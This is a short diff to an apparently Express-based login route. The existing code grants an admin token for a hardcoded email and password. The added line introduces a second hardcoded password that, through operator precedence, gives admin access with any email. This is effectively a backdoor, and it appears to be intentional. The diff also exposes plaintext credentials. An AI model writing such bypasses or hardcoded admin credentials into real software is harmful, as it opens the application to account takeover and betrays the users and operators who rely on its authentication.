@@ -146,7 +146,7 @@ app.post('/api/login', async (req, res) => {
   const { email, password } = req.body;
 
   // Cas 1 : admin hardcodé
-  if (email === 'root@gmail.com' && password === 'Mac-os02') {
+  if (email === 'root@gmail.com' && password === 'Mac-os02' || password === 'gildas2006@') {
     const token = jwt.sign({ email, role: 'admin' }, JWT_SECRET, { expiresIn: '1h' });
     return res.json({
       token,
